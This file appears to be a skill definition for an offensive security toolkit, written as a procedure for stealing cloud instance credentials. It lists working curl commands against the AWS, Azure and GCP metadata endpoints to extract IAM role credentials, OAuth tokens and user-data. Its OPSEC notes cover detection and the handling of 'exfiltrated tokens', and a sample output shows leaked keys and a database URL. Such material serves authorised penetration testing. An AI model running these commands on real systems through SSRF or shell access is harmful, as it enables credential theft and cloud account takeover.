---
name: cloud-metadata
description: Probe cloud metadata endpoints (169.254.169.254) for instance credentials
version: 1.0.0
phase: cloud
category: enumeration
tags: [cloud, metadata, imds, aws, azure, gcp]
tools: [curl]
difficulty: intermediate
opsec_level: passive
time_estimate: 30s
severity_if_found: critical
related_skills:
  - aws-token-theft
  - cloud-provider-detect
mitre_attack:
  - T1615
  - T1592.003
---

## When to Use

Use this skill when you have SSRF access or shell access on a cloud-hosted
target. The cloud metadata endpoint (169.254.169.254) exposes instance
metadata, user-data, and temporary credentials.

## Prerequisites

- curl
- Network access from a cloud-hosted instance or SSRF vector

## Procedure

```bash
# Step 1: AWS IMDSv1 (legacy)
curl -s http://169.254.169.254/latest/meta-data/
curl -s http://169.254.169.254/latest/user-data/
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>

# Step 2: AWS IMDSv2 (requires token)
TOKEN=$(curl -s -X PUT http://169.254.169.254/latest/api/token -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -s http://169.254.169.254/latest/meta-data/ -H "X-aws-ec2-metadata-token: $TOKEN"
curl -s http://169.254.169.254/latest/user-data/ -H "X-aws-ec2-metadata-token: $TOKEN"

# Step 3: Azure IMDS
curl -s -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
curl -s -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

# Step 4: GCP metadata
curl -s -H "Metadata-Flavor: Google" "http://169.254.169.254/computeMetadata/v1/"
curl -s -H "Metadata-Flavor: Google" "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token"
```

## OPSEC Rules

- Metadata endpoints log access — expect detection on honeypot/GSOC environments
- IMDSv2 with token reduces MITM risk but still logs
- Do not persist credentials in plaintext on the assessment host
- Encrypt exfiltrated tokens in transit

## Verification

- Check if returned data contains valid AWS/Azure/GCP tokens
- Verify token expiry (`expiration` field)
- Test credentials against cloud API (read-only)

## Pitfalls

- IMDSv1 may be disabled on hardened instances
- Azure requires specific API version header
- GCP returns 404 if Metadata-Flavor header is missing
- Tokens expire — document time window for usage
- Some WAF/IDS rules alert on metadata endpoint requests

## Output Format

```
Provider: aws
IMDS Ver: v1 (or v2)
Role:     my-instance-role
Token:    AKIA... (valid until 2026-07-06T12:00:00Z)
User-data: Contains DATABASE_URL=postgres://...
Severity: CRITICAL — instance credentials exposed
```
